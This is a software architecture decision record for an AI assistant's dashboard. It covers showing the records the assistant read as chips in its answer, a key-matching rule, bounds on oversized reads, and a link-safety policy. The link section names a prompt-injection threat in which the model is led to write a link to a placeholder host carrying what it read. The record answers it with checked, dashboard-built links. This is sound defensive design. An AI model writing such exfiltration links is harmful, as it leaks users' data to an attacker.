# ADR-0061: A read is named in the answer, never drawn as a card

- **Status:** accepted
- **Authority:** `internal/assistant/wire`
- **Enforced-by:** `internal/assistant/catalog.TestEveryDefaultReadIsBounded`, `internal/assistant/catalog.TestAGenericListReadIsOnePage`, `internal/assistant/cards.TestARecordCarriesTheKeyProseWritesItBy`, `internal/assistant/cards.TestTheModelIsToldARecordsKey`, `internal/assistant/cards.TestAKeyedKindNeedsItsKeyAndNoOtherHasOne`, `internal/assistant/catalog.TestARecordIsKeyedTheWayTheAnswerNamesIt`, `internal/assistant/catalog.TestAReadTooLargeToShowIsNamedLinkedAndToldToTheModel`, `internal/assistant/catalog.TestACutReadTellsTheModelOnlyWhatTheEngineKnows`, `internal/assistant/catalog.TestEveryModelTextGoesThroughThePipeline`, `internal/assistant/catalog.TestEveryNarrowingArgumentNarrows`, `internal/assistant/catalog.TestAPageWithMoreIsNeverTheWhole`, `internal/assistant/catalog.TestTwoReadsOfOneToolAreToldApart`, `internal/assistant/catalog.TestAChatReadSaysTheRoomAsPeopleWriteIt`, `internal/assistant/catalog.TestAChatReadIsToldApartByWhatItAsks`, `internal/api/queries.TestTheAssistantsPageOfRoomsIsReadInOneStep`, `internal/assistant/wire.TestTheDashboardSpeaksTheAssistantProtocol`, and the dashboard's `mentions.test.tsx`, `reads.test.tsx`, `Thread.test.tsx`, `inert.test.tsx`, `components/InlineToken.test.tsx` (`checked links`), `lib/markdown.test.tsx` (`prose`), `routes/chatlet/Room.test.tsx` (`a message's links`) and `routes/live/Executors.test.tsx` (`a parked run's question opens only what the dashboard built`)
- **Cost-when-tried:** the drawer drew a folded card for every read a turn made. An answer on the Inbox that read two tasks, a table and an agent, and then both tasks again, stood six cards of about 140px each between the reader and the answer in a 560px drawer, each saying its key twice (in its summary and as its link's label), and the same record twice. An answer on Company › Brand added a blue notice per read and table cards whose CSV, XLSX and link wrapped onto a second line or not depending on the length of the title.
- **Tag-status:** unreleased

## The decision

The rule spans the wire (`EntityCard.key`), the read catalog
(`internal/assistant/catalog`, which reads carry a key), the prompt
(`internal/assistant/prompt.go`, how the model names a record) and the
dashboard (`app/assistant/chunk/mentions.ts`, the matching rule, and
`reads.tsx`, the chips and their peeks); the wire is where the two sides meet,
so it is the record's authority.

**A table or a record a turn read is never drawn as a card.** The answer's
prose names it, and the first mention of each record the turn read is that
record's chip, which opens a peek holding everything its card held: the
facts, the body and the list under it, a table's rows, its downloads, and the
way to its page. A record the turn read and the answer never named is listed
on one "Also looked up" line under the answer. A proposal, a refusal, a notice, a
file, a brief and an open in app are the point of their turn and stay cards.

**The records are the turn's reads, never the model's words.** Only a record
a read built a card for can become a chip; a key the model writes that the
turn never read is no chip, and every chip's link is the engine's own address,
checked by the dashboard as every card's was.

**No address the model writes is opened; a link the dashboard builds is.** The
answer's words are read with `links: "checked"` (`lib/inlineTokens.ts`,
`LinkMode`), the rule the Inbox reads an agent's words by too, an executor's
Answer dialog its question, and Chatlet a message's links, whoever wrote the
message: a link is live only where the dashboard BUILT it, from parts it
checked, to a place that is the company's. A key whose project is the
company's opens its work item, a handle in the chart its seat and the name of
a room the reader may read its room, all app routes the dashboard writes; a
reference, a commit or a repository opens the code host the company
configured, and only under an owner that host names (`link_hosts`' `owners`),
so a host that names none links no reference at all; and an address on a host
the company configured (a code host, Jira, Confluence, Mattermost) opens as it
is rebuilt from what it names (`<host>/<owner>/<repo>/pull/14`), a rebuilt
GitHub or GitLab address only under an owner its host names, as a reference
is, with no query, fragment or anything else the model wrote, and is labelled
only from those rebuilt parts. Every other address, an app route the model
spelled among them, is drawn inert: its words and the host it names, readable
and copyable, and never a control. A picture is its alt text, never fetched.
The threat is a prompt injection that has the model write
`https://evil.example/?q=<what it read>`: a click there hands the words to the
host's owner, where a click on a link the dashboard built carries only a
validated name or number to the company's own place.

**Deliberately, the assistant, the Inbox, an executor's question and a chat
message's links only.** A run's question is read so wherever it is answered:
its Answer dialog (`components/writes.tsx`), opened from Live › Executors, a
seat's page and every decision row, draws its context and the run's reasoning
`checked`. Doclet pages, a work item's description and comments read anywhere
but the Inbox still open any safe address as written (`links: "anchor"`);
whether those surfaces read `checked` too is an open question for the owner,
not a gap in this record.

**A record carries the key prose writes it by.** `EntityCard.key` is a task's
key or a project's, or a chat room's name with its `#` (`#launch`, an address
written exactly, in lower case and never renamed), set from the record by its
read's spec, never guessed from `subtitle`. A seat carries none: the prompt has
the model name a seat by its name, never its handle, so a seat is found by its
name. Nor does a direct conversation, which has no name: it is headed by its
people, and words an answer writes about anybody are never its chip. The
model's digest of the card carries the key, and the prompt tells it to name
each record exactly as its tools gave it, outside code.

**The matching rule** is stated once, in `mentions.ts`:

- A key exactly, case and all, at token boundaries: no letter, digit,
  underscore or hyphen on either side, so `GOP-11` is never found in `GOP-110`
  or `GOP-11-b`. A slash delimits tokens, so both keys of `GOP-10/GOP-11` are
  found.
- A name only for the kinds whose title is a name people write (an agent, a
  team, a project, a page, a space, an artifact, a schedule), whole and in its
  own case; never a task's title, a table's or a record of no kind.
- **A one-word name in sentence case is never a sentence's first word.**
  "Design is late" and "Notes from the call" are capitalised because they
  start a sentence, not because they name the team or the page. A name no
  ordinary word is spelled like (all capitals, a capital inside it, a digit:
  "QA", "GoPhrase"), a name of two words or more, and a key are still matched
  there, since a sentence's capital cannot make an ordinary word look like
  them. The renderer says which run opens a block (a paragraph, a heading, a
  list item, a table cell), and the matcher reads the run before, so a
  sentence's start is known across emphasis and blocks.
- **A name two reads share names neither.** Two seats both called "QA" cannot
  be told apart by the word, so neither is a chip and both are listed under the
  answer; a record with a key is still matched by its key.
- **Nothing in an address or a path.** A word (between spaces, its brackets,
  quotes and stops aside) that is a bare address (a scheme's `://`, a `www.`
  host) or a path (starting with `/`, `./` or `../`, or with a slash after a
  part that is no key) is something the model wrote out, and a key in it
  (`https://x.test/GOP-11`, `/worklet/GOP-11`, `worklet/GOP-11`) is part of it.
- The earliest mention first and, at one place, the longer; only the first
  mention of a record.
- It reads only the words a reader reads: the Markdown renderer hands each run
  of prose to it (`RenderOptions.prose`), never a code span, a code block or a
  link's label.
- The drawer works the mentions out once per change of the answer's words or
  the turn's cards: each answer is handed one array of its cards while they
  are unchanged, and holds one object of handlers for its life
  (`useLatestHandlers`), each calling the newest its caller gave, so neither a
  clock tick nor handlers built inline undo the memo.

## Why the obvious alternatives are wrong

- **Matching on the subtitle.** A task's subtitle happens to be its key today,
  but a page's is its space and a seat's its handle. A rule that guessed would
  turn a space's name into a page's chip.
- **Every link the model writes inert, as this record first decided.** A key
  or a pull request named in an answer was then grey text the reader had to
  find again by hand, though the dashboard could build its link from the
  same checked parts it links a key by everywhere else. What made a model's
  link dangerous was the address it chose, never the record it named.
- **Every link live where its address is safe (`anchor`).** `safeHref`
  refuses a script and keeps an `https:` address, and an `https:` address is
  exactly what carries the words away.
- **Matching the rendered DOM or React tree.** The renderer draws code through
  a component and an inert link as a span, so a walker that skips "code" and
  "a" elements by tag misses both. The renderer already knows which words are
  prose, as search highlighting does, and says so.
- **Keeping the cards, compacted.** Measured in the prototype at the drawer's
  width, compact cards still cost about 165px for four reads and stack a
  surface per record; chips cost none, and the owner chose them.

## A read too large to show, and a page of one

**A read past what one step reads is still a read.** Its answer is never
shown, but it is an oversize card (`OversizeCard`): named for what it read
(the table it would have been, or its step), with the screen that shows all
of it, built from the read's own arguments through the same link table every
card's Open uses, and what the tool takes that would narrow it. The drawer
lists it on the Also looked up line as "Matching tasks, ... (too large to show
here)", whose peek says so, links that screen and names what to narrow. It
replaced a notice that told a person inside the app to "open it in the app".

**The model is told the read was cut**, never handed a bare notice, and
**only in the engine's words**: the tool, the route pattern it read (the
catalogue's own, never the model's spelling), that none of it was shown, the
bound, what narrows it (the tool's own arguments, or for a generic read the
query parameters the API reference documents for the route) and not to answer
as though it read it. Not one byte of the cut answer reaches the model, not
even a field's name: a payload's keys are written by whoever wrote the
payload, so naming the fields a cut answer began with would hand the model
unvouched text past the fence. The fact goes through the same pipeline as every
result (`modelFact`, then `modelText`): fenced under the tool's trust where
the tool reads somebody's text, defused where it does not, and held to
`cards.ModelBytes`. `catalog.TestEveryModelTextGoesThroughThePipeline` holds
every `Result.Model` the catalogue builds to a pipeline producer, and only
`modelText` fences or defuses.

**A card that is a page says so itself.** A table carries `truncated` (rows
cut to fit the card) and `more` (rows past the page the read asked for), and
a record its `items_total` (items cut to fit) and `items_more` (items past the
page, a thread's older comments); the drawer says "first 20" on the chip and
which screen shows the rest in the peek, and the model is told the count is a
floor. The notice beside each shortened card is gone. **A read is that one
page and takes no cursor**: a page past the first would be a second read
titled as the first, which the drawer, keeping one read per title or record,
takes for the same read and keeps once. What lies past it is narrowed to (a
search's words, its author) or read on the screen its card opens.

**Two reads of one tool are two titles.** The drawer tells reads apart by a
table's title and a record's kind and id, so every argument that changes what
a read sends is said in its title's scope (`Tool.Scope`) or names its record;
a room the call names by its id is said as the turn reads it, through the
person's grant (`Tool.Room`), a direct conversation by its people.
`catalog.TestTwoReadsOfOneToolAreToldApart` proves it for every read and
every such argument, rather than holding a list of exemptions.

**What narrows a read is an explicit list.** Each read declares `Tool.Narrow`,
the arguments that ask for less (a search's words, a filter, a shorter
window), never every argument but a few: a flag that widens ("show closed"),
pages or picks a view is not one. A generic read is offered the route's
documented query parameters that `narrowingQuery`, the one list of parameters
that narrow, holds. `catalog.TestEveryNarrowingArgumentNarrows` proves each
entry changes the request only by parameters on that list, none of a
widening shape.

**No default read is cut, and no public route changes for it.** Measured on a
real company before deciding: every dedicated read stayed under the step's 64
KiB at its defaults (the largest, the token breakdown, 55 KB), and what crossed
it were generic `api_request` reads of routes whose defaults are heavy. The
chat reads that came after are bounded by their pages, and the rooms read by
its size: the rail answers every room whole beside the person's whole read
state, so `list_chat_rooms` asks for the fifteen most recently active, 58,116
bytes with every field of every room and the read state at its cap
(`queries.TestTheAssistantsPageOfRoomsIsReadInOneStep`), the rest of the step
left for markup, which the encoding writes as six bytes to a `<`, `>` or `&`;
the whole rail was past a step for a person in about sixty rooms. The
routes' defaults stay their own: the dashboard and every other caller read them
as they always have. The bound is applied by the assistant's read layer
(`internal/assistant/catalog`), where its requests are built:

- `GET /agents/{id}` answers the seat's call history (fifty whole transcripts,
  2.1 MB for a busy seat) by default. Every read the assistant makes of it asks
  for the seat alone with `history=false`: `get_agent`, the create preview, and
  a generic `api_request` read, which adds it unless the model names `history`
  itself.
- A generic read of a list route the reference says pages by `limit` (the
  event log, the turns, the inbox) is asked for a page of 25 when the model
  names none, so it is answered whole with the route's cursor, and the model
  answers from that first page rather than from nothing.
- Every dedicated read declares its bound (a page, a window, one record, a
  route's own cap, or one row per configured thing) and any parameter it must
  send to stay inside it, and `catalog.TestEveryDefaultReadIsBounded` holds
  each request to it: a page asks for a limit and its card reads the answer's
  own word that more lie past it; a record read names the argument its record
  is asked by, and its path carries that value as a segment of its own. A new
  read that declares none, a page that drops its limit or its More, a record
  read that asks a list route, or a seat read that drops `history=false` fails
  the build. The inbox and the project list, which read whole, now ask for a
  page.

The oversize card and the model's `cut` answer stay as the net for what a
read the model narrows by hand still makes too large.
